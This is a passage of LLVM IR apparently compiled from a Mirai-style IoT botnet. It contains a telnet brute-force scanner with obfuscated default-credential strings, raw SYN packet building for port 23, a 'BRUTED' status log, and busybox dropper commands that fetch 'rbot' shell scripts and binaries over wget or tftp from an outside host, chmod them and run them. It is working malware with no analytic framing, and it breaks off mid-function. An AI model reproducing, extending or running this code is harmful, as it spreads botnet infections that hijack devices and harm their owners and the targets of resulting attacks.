@payloads = dso_local global [4 x %struct.payload] [%struct.payload { i8 1, i8 40, i8* getelementptr inbounds ([1081 x i8], [1081 x i8]* @.str.16, i32 0, i32 0), i16 1080 }, %struct.payload { i8 1, i8 41, i8* getelementptr inbounds ([1337 x i8], [1337 x i8]* @.str.17, i32 0, i32 0), i16 1336 }, %struct.payload { i8 2, i8 8, i8* getelementptr inbounds ([1889 x i8], [1889 x i8]* @.str.18, i32 0, i32 0), i16 1888 }, %struct.payload { i8 1, i8 8, i8* getelementptr inbounds ([1921 x i8], [1921 x i8]* @.str.19, i32 0, i32 0), i16 1920 }], align 16
@scanner_pid = dso_local global i32 0, align 4
@LOCAL_ADDR = dso_local global i32 0, align 4
@rsck = dso_local global i32 0, align 4
@.str.20 = private unnamed_addr constant [5 x i8] c"PMMV\00", align 1
@.str.21 = private unnamed_addr constant [6 x i8] c"VVLGV\00", align 1
@.str.22 = private unnamed_addr constant [9 x i8] c"\13\12\12\13AJKL\00", align 1
@.str.23 = private unnamed_addr constant [6 x i8] c"KTFGT\00", align 1
@.str.24 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.25 = private unnamed_addr constant [4 x i8] c"@KL\00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"FGDCWNV\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"FCGOML\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"AOQ\17\12\12\00", align 1
@.str.29 = private unnamed_addr constant [8 x i8] c"pmmv\17\12\12\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"pmmv\00", align 1
@.str.31 = private unnamed_addr constant [8 x i8] c"VQNKLWZ\00", align 1
@.str.32 = private unnamed_addr constant [9 x i8] c"XQWL\13\13\1A\1A\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"rNQaJEoG\13\00", align 1
@.str.34 = private unnamed_addr constant [8 x i8] c"WREPCFG\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"VGNAM\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"\13\13\13\13\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"\16\11\10\13\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"WKF\1F\12\00", align 1
@.str.39 = private unnamed_addr constant [5 x i8] c"WKF\12\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"Q[QVGO\00", align 1
@.str.41 = private unnamed_addr constant [11 x i8] c"VGNLGVPMMV\00", align 1
@.str.42 = private unnamed_addr constant [13 x i8] c"PMMVRCQQUMPF\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"PMMVRCQQ\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"VGNLGVRCQQ\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"VGNLGVRCQQUMPF\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"RCQQUMPF\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"RCQQ\00", align 1
@.str.48 = private unnamed_addr constant [6 x i8] c"QJGNN\00", align 1
@.str.49 = private unnamed_addr constant [14 x i8] c"VCxXb\10\11\16\1B\17\1A\17\1B\00", align 1
@.str.50 = private unnamed_addr constant [10 x i8] c"VQEMKLEML\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"QWRGPWQGP\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"NKLWZQJGNN\00", align 1
@.str.53 = private unnamed_addr constant [15 x i8] c"V\12VCNA\12LVP\12N\16\03\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"EWGQV\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"\13\10\11\16\17\14\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"\13\10\11\16\17\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"WQGP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"CFOKL\00", align 1
@.str.59 = private unnamed_addr constant [7 x i8] c"FGTKAG\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"\13\10\11\16\00", align 1
@.str.61 = private unnamed_addr constant [11 x i8] c"\13\10\11\16\17\14\15\1A\1B\12\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"\13\13\13\13\13\13\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"\13\1B\1A\1A\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"\10\10\10\10\10\00", align 1
@.str.65 = private unnamed_addr constant [14 x i8] c"cFOKLKQVPCVMP\00", align 1
@.str.66 = private unnamed_addr constant [14 x i8] c"CFOKLKQVPCVMP\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"cFOKL\00", align 1
@.str.68 = private unnamed_addr constant [4 x i8] c"CFO\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"\15WHoIM\12CFOKL\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"QOACFOKL\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"CFOKL\13\10\11\16\00", align 1
@.str.72 = private unnamed_addr constant [9 x i8] c"CFOKL\13\10\11\00", align 1
@.str.73 = private unnamed_addr constant [7 x i8] c"C@A\13\10\11\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"ACV\13\12\10\1B\22\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"\17WR\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"\03PMMV\00", align 1
@.str.77 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.78 = private unnamed_addr constant [3 x i8] c"\13\10\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"CLVQNS\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"\13\10\11\16\17\14\15\1A\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"\12\12\12\12\12\12\00", align 1
@.str.82 = private unnamed_addr constant [9 x i8] c"\12\12\12\12\12\12\12\12\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"\13\10\11\16SUGP\00", align 1
@.str.84 = private unnamed_addr constant [9 x i8] c"CLLK\10\12\13\11\00", align 1
@.str.85 = private unnamed_addr constant [6 x i8] c"\17\16\11\10\13\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"XNZZ\0C\22\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"HT@XF\00", align 1
@.str.88 = private unnamed_addr constant [5 x i8] c"CLIM\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"ZOJFKRA\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"ZA\11\17\13\13\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"TKXZT\00", align 1
@.str.92 = private unnamed_addr constant [8 x i8] c"CLVQNS\22\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"HWCLVGAJ\00", align 1
@.str.94 = private unnamed_addr constant [8 x i8] c"eo\1A\13\1A\10\22\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"\1A\1A\1A\1A\1A\1A\00", align 1
@.str.96 = private unnamed_addr constant [7 x i8] c"\14\14\14\14\14\14\00", align 1
@.str.97 = private unnamed_addr constant [9 x i8] c"JWLV\17\15\17\1B\00", align 1
@.str.98 = private unnamed_addr constant [11 x i8] c"QWRGPTKQMP\00", align 1
@.str.99 = private unnamed_addr constant [9 x i8] c"X[CF\13\10\11\16\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"OE\11\17\12\12\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"OGPNKL\00", align 1
@.str.102 = private unnamed_addr constant [8 x i8] c"QWRRMPV\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"VGNLGV\00", align 1
@.str.104 = private unnamed_addr constant [9 x i8] c"MRGPCVMP\00", align 1
@.str.105 = private unnamed_addr constant [37 x i8] c"enable\0D\0Asystem\0D\0Ashell\0D\0Ash\0D\0Aping ; sh\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.107 = private unnamed_addr constant [141 x i8] c"/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.109 = private unnamed_addr constant [5 x i8] c"arm4\00", align 1
@.str.110 = private unnamed_addr constant [142 x i8] c"/bin/busybox cat /proc/cpuinfo || while read i; do /bin/busybox echo $i; done < /proc/cpuinfo || /bin/busybox dd if=/proc/cpuinfo count=1; %s\00", align 1
@.str.111 = private unnamed_addr constant [18 x i8] c">%s.file && cd %s\00", align 1
@.str.112 = private unnamed_addr constant [32 x i8] c"/bin/busybox rm -rf .file %s %s\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c".rbot.binary\00", align 1
@.str.114 = private unnamed_addr constant [14 x i8] c".rbot.dropper\00", align 1
@.str.115 = private unnamed_addr constant [98 x i8] c"/bin/busybox cp /bin/busybox .rbot.binary; >.rbot.binary; /bin/busybox chmod 777 .rbot.binary; %s\00", align 1
@.str.116 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.117 = private unnamed_addr constant [142 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.sh -O- >.rbot.shell; /bin/busybox tftp -g -l .rbot.shell -r rbot.sh %d.%d.%d.%d; sh .rbot.shell; %s\00", align 1
@.str.118 = private unnamed_addr constant [41 x i8] c"/bin/busybox wget; /bin/busybox tftp; %s\00", align 1
@.str.119 = private unnamed_addr constant [101 x i8] c"/bin/busybox cp /bin/busybox .rbot.dropper; >.rbot.dropper; /bin/busybox chmod 777 .rbot.dropper; %s\00", align 1
@.str.120 = private unnamed_addr constant [125 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.%s -O- >.rbot.binary; /bin/busybox chmod 777 .rbot.binary;./.rbot.binarys wget; %s\00", align 1
@.str.121 = private unnamed_addr constant [121 x i8] c"/bin/busybox tftp -g -l .rbot.binary -r rbot.%s %d.%d.%d.%d; /bin/busybox chmod 777 .rbot.binary;./.rbot.binary tftp; %s\00", align 1
@.str.122 = private unnamed_addr constant [50 x i8] c"/bin/busybox echo -en '%s' %s .rbot.dropper;%s;%s\00", align 1
@.str.123 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.124 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.125 = private unnamed_addr constant [36 x i8] c"./.rbot.dropper;./.rbot.binary echo\00", align 1
@.str.126 = private unnamed_addr constant [24 x i8] c"chmod 777 .rbot.dropper\00", align 1
@pid1 = dso_local global i32 0, align 4
@pid2 = dso_local global i32 0, align 4
@spid = dso_local global i32 0, align 4
@maintain_thread = dso_local global i32 0, align 4
@mainpid = dso_local global i32 0, align 4
@rsck_out = dso_local global i32 0, align 4
@.str.127 = private unnamed_addr constant [68 x i8] c"[%d.%d.%d.%d:23] [%s:%s] [%s] [Status:%s] [Method:%d] [Attempt #%d]\00", align 1
@.str.128 = private unnamed_addr constant [9 x i8] c"FINISHED\00", align 1
@.str.129 = private unnamed_addr constant [7 x i8] c"BRUTED\00", align 1
@.str.130 = private unnamed_addr constant [7 x i8] c"\\x%02x\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"\7FELF\00", align 1
@.str.132 = private unnamed_addr constant [6 x i8] c"arm64\00", align 1
@.str.133 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.134 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.135 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.136 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.137 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.138 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@__const.consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@__const.consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@.str.139 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.140 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.141 = private unnamed_addr constant [10 x i8] c"ncomplete\00", align 1
@.str.142 = private unnamed_addr constant [15 x i8] c"attempt failed\00", align 1
@.str.143 = private unnamed_addr constant [6 x i8] c"% Bad\00", align 1
@.str.144 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.145 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.146 = private unnamed_addr constant [4 x i8] c"ser\00", align 1
@.str.147 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.148 = private unnamed_addr constant [11 x i8] c"sage: wget\00", align 1
@.str.149 = private unnamed_addr constant [11 x i8] c"sage: tftp\00", align 1
@.str.150 = private unnamed_addr constant [21 x i8] c"ead-only file system\00", align 1
@.str.151 = private unnamed_addr constant [17 x i8] c"ermission denied\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @recv_strip_null(i32 %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %43

20:                                               ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

21:                                               ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %42

25:                                               ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

33:                                               ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

38:                                               ; preds = %33, %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %10, align 4
  br label %21, !llvm.loop !6

42:                                               ; preds = %21
  br label %43

43:                                               ; preds = %42, %4
  %44 = load i32, i32* %9, align 4
  ret i32 %44
}

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @fdclose(%struct.scanner_connection* %0, i32 %1) #0 {
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %6 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %5, i32 0, i32 8
  %7 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %7, i8 0, i64 16, i1 false)
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 1
  %10 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %9, i32 0, i32 0
  store i32 0, i32* %10, align 8
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 12
  store i8 0, i8* %12, align 1
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 9
  store i8 0, i8* %14, align 4
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 1
  %17 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %16, i32 0, i32 1
  store i32 -1, i32* %17, align 4
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 5
  store i32 0, i32* %19, align 4
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 6
  store i32 0, i32* %21, align 8
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 2
  %24 = load i32, i32* %23, align 8
  %25 = icmp ne i32 %24, -1
  br i1 %25, label %26, label %31

26:                                               ; preds = %2
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 2
  %29 = load i32, i32* %28, align 8
  %30 = call i32 @close(i32 %29)
  br label %31

31:                                               ; preds = %26, %2
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %32, i32 0, i32 2
  store i32 -1, i32* %33, align 8
  %34 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %35 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %34, i32 0, i32 16
  store i32 0, i32* %35, align 8
  ret void
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @szprintf(i8* %0, i8* %1, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i64 0, i64 0
  %8 = bitcast %struct.__va_list_tag* %7 to i8*
  call void @llvm.va_start(i8* %8)
  %9 = load i8*, i8** %4, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i64 0, i64 0
  %12 = call i32 @vsprintf(i8* %9, i8* %10, %struct.__va_list_tag* %11) #9
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i64 0, i64 0
  %14 = bitcast %struct.__va_list_tag* %13 to i8*
  call void @llvm.va_end(i8* %14)
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_start(i8*) #3

; Function Attrs: nounwind
declare i32 @vsprintf(i8*, i8*, %struct.__va_list_tag*) #4

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_end(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdsend(i32 %0, i8* %1, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca [5026 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca [1 x %struct.__va_list_tag], align 16
  store i32 %0, i32* %4, align 4
  store i8* %1, i8** %5, align 8
  store i32 0, i32* %7, align 4
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i64 0, i64 0
  %10 = bitcast %struct.__va_list_tag* %9 to i8*
  call void @llvm.va_start(i8* %10)
  %11 = getelementptr inbounds [5026 x i8], [5026 x i8]* %6, i64 0, i64 0
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i64 0, i64 0
  %14 = call i32 @vsprintf(i8* %11, i8* %12, %struct.__va_list_tag* %13) #9
  store i32 %14, i32* %7, align 4
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i64 0, i64 0
  %16 = bitcast %struct.__va_list_tag* %15 to i8*
  call void @llvm.va_end(i8* %16)
  %17 = load i32, i32* %4, align 4
  %18 = getelementptr inbounds [5026 x i8], [5026 x i8]* %6, i64 0, i64 0
  %19 = load i32, i32* %7, align 4
  %20 = sext i32 %19 to i64
  %21 = call i64 @send(i32 %17, i8* %18, i64 %20, i32 16384)
  %22 = load i32, i32* %7, align 4
  %23 = sext i32 %22 to i64
  %24 = icmp ne i64 %21, %23
  br i1 %24, label %25, label %26

25:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %29

26:                                               ; preds = %2
  %27 = load i32, i32* %4, align 4
  %28 = call i64 @send(i32 %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 2, i32 16384)
  store i32 1, i32* %3, align 4
  br label %29

29:                                               ; preds = %26, %25
  %30 = load i32, i32* %3, align 4
  ret i32 %30
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca %struct.iphdr*, align 8
  %5 = alloca %struct.tcphdr*, align 8
  %6 = alloca %struct.payload*, align 8
  %7 = alloca %struct.binary*, align 8
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.fd_set, align 8
  %10 = alloca %struct.scanner_connection*, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.tcphdr*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca i32, align 4
  %22 = alloca [1514 x i8], align 16
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.tcphdr*, align 8
  %25 = alloca %struct.scanner_connection*, align 8
  %26 = alloca %union.__SOCKADDR_ARG, align 8
  %27 = alloca i32, align 4
  %28 = alloca %struct.fd_set*, align 8
  %29 = alloca i32, align 4
  %30 = alloca %struct.fd_set*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = call i32 @fork() #9
  store i32 %37, i32* @scanner_pid, align 4
  %38 = load i32, i32* @scanner_pid, align 4
  %39 = icmp sgt i32 %38, 0
  br i1 %39, label %43, label %40

40:                                               ; preds = %0
  %41 = load i32, i32* @scanner_pid, align 4
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %44

43:                                               ; preds = %40, %0
  ret void

44:                                               ; preds = %40
  %45 = call i32 @util_local_addr()
  store i32 %45, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %46 = call i64 @time(i64* null) #9
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* @fake_time, align 4
  %48 = call noalias align 16 i8* @calloc(i64 628, i64 8264) #9
  %49 = bitcast i8* %48 to %struct.scanner_connection*
  store %struct.scanner_connection* %49, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %1, align 4
  br label %50

50:                                               ; preds = %74, %44
  %51 = load i32, i32* %1, align 4
  %52 = icmp slt i32 %51, 628
  br i1 %52, label %53, label %77

53:                                               ; preds = %50
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %55 = load i32, i32* %1, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i64 %56
  %58 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %57, i32 0, i32 16
  store i32 0, i32* %58, align 8
  %59 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %60 = load i32, i32* %1, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %59, i64 %61
  %63 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %62, i32 0, i32 2
  store i32 -1, i32* %63, align 8
  %64 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %65 = load i32, i32* %1, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %64, i64 %66
  %68 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %67, i32 0, i32 12
  store i8 0, i8* %68, align 1
  %69 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %70 = load i32, i32* %1, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %69, i64 %71
  %73 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %72, i32 0, i32 6
  store i32 0, i32* %73, align 8
  br label %74

74:                                               ; preds = %53
  %75 = load i32, i32* %1, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %1, align 4
  br label %50, !llvm.loop !8

77:                                               ; preds = %50
  %78 = call i32 @socket(i32 2, i32 3, i32 6) #9
  store i32 %78, i32* @rsck, align 4
  %79 = icmp eq i32 %78, -1
  br i1 %79, label %80, label %81

80:                                               ; preds = %77
  call void @exit(i32 0) #10
  unreachable

81:                                               ; preds = %77
  %82 = load i32, i32* @rsck, align 4
  %83 = load i32, i32* @rsck, align 4
  %84 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 3, i32 0)
  %85 = or i32 2048, %84
  %86 = call i32 (i32, i32, ...) @fcntl(i32 %82, i32 4, i32 %85)
  store i32 1, i32* %1, align 4
  %87 = load i32, i32* @rsck, align 4
  %88 = bitcast i32* %1 to i8*
  %89 = call i32 @setsockopt(i32 %87, i32 0, i32 3, i8* %88, i32 4) #9
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %94

91:                                               ; preds = %81
  %92 = load i32, i32* @rsck, align 4
  %93 = call i32 @close(i32 %92)
  call void @exit(i32 0) #10
  unreachable

94:                                               ; preds = %81
  br label %95

95:                                               ; preds = %99, %94
  %96 = call i32 @rand_next()
  %97 = and i32 %96, 65535
  %98 = trunc i32 %97 to i16
  store i16 %98, i16* %2, align 2
  br label %99

99:                                               ; preds = %95
  %100 = load i16, i16* %2, align 2
  %101 = call zeroext i16 @ntohs(i16 zeroext %100) #11
  %102 = zext i16 %101 to i32
  %103 = icmp slt i32 %102, 1024
  br i1 %103, label %95, label %104, !llvm.loop !9

104:                                              ; preds = %99
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %4, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.tcphdr*
  store %struct.tcphdr* %107, %struct.tcphdr** %5, align 8
  %108 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %109 = bitcast %struct.iphdr* %108 to i8*
  %110 = load i8, i8* %109, align 4
  %111 = and i8 %110, -16
  %112 = or i8 %111, 5
  store i8 %112, i8* %109, align 4
  %113 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %114 = bitcast %struct.iphdr* %113 to i8*
  %115 = load i8, i8* %114, align 4
  %116 = and i8 %115, 15
  %117 = or i8 %116, 64
  store i8 %117, i8* %114, align 4
  %118 = call zeroext i16 @htons(i16 zeroext 40) #11
  %119 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %120 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %119, i32 0, i32 2
  store i16 %118, i16* %120, align 2
  %121 = call i32 @rand_next()
  %122 = trunc i32 %121 to i16
  %123 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %124 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %123, i32 0, i32 3
  store i16 %122, i16* %124, align 4
  %125 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 5
  store i8 64, i8* %126, align 4
  %127 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 6
  store i8 6, i8* %128, align 1
  %129 = call zeroext i16 @htons(i16 zeroext 23) #11
  %130 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %131 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %130, i32 0, i32 1
  store i16 %129, i16* %131, align 2
  %132 = load i16, i16* %2, align 2
  %133 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
